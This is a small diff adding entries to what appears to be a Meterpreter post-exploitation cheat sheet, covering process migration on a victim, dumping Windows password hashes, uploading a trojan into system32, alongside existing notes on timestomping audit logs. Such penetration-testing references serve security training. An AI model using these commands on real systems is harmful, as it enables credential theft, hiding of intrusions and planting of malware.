@@ -24,6 +24,12 @@ Incognito \(Similar to `ps`\)
 
 Remove timestamps \(audit log\): `timestomp`
 
+Migrate (migrate to another process on the victim):  `meterpreter > run post/windows/manage/migrate`
+
+hashdump: `meterpreter > run post/windows/gather/hashdump `
+
+upload: `upload evil_trojan.exe c:\\windows\\system32`
+
 ### Useful Meterpreter Scripts
 
 Checks to see if you exploited a virtual machine
